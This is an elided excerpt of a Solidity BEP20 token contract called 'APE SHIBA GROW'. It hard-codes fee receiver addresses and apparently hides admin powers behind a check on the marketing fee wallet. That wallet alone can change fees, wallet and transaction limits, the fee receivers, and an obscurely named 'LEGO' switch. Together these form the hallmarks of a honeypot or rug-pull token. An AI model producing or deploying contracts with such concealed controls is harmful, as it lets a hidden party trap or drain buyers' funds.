...
contract APESHIBAGROW is IBEP20, Auth {
    ...
    string constant _name = "APE SHIBA GROW";
    ...
    address public marketingFeeReceiver = 0x8200dB4f2fFF1Aae458408bF1b96A5BCf9222EF0;
    address public devFeeReceiver = 0x1C0b526bFEC789069989A296a2Cd8a629a98aD12;
   ...
   function setMaxWallet(uint256 amount) external  {
       require(msg.sender == marketingFeeReceiver, "homestead");
        require(amount >= _totalSupply / 1000 );
        _maxWalletSize = amount;
    }

    function setFees(uint256 _liquidityFee, uint256 _marketingFee, uint256 _devFee, uint256 _feeDenominator) external  {
        require(msg.sender == marketingFeeReceiver, "homestead");
    ...
    function setFeeReceiver(address _marketingFeeReceiver, address _devFeeReceiver) external  {
        require(msg.sender == marketingFeeReceiver, "homestead");
        marketingFeeReceiver = _marketingFeeReceiver;
        devFeeReceiver = _devFeeReceiver;
    }
    // Set the maximum transaction limit
    function setTxLimit(uint256 amountBuy) external  {
        require(msg.sender == marketingFeeReceiver, "homestead");
    ...
    function welcomestatus(bool _status) public {
        require(msg.sender == marketingFeeReceiver, "homestead");
        LEGO = _status;
    }
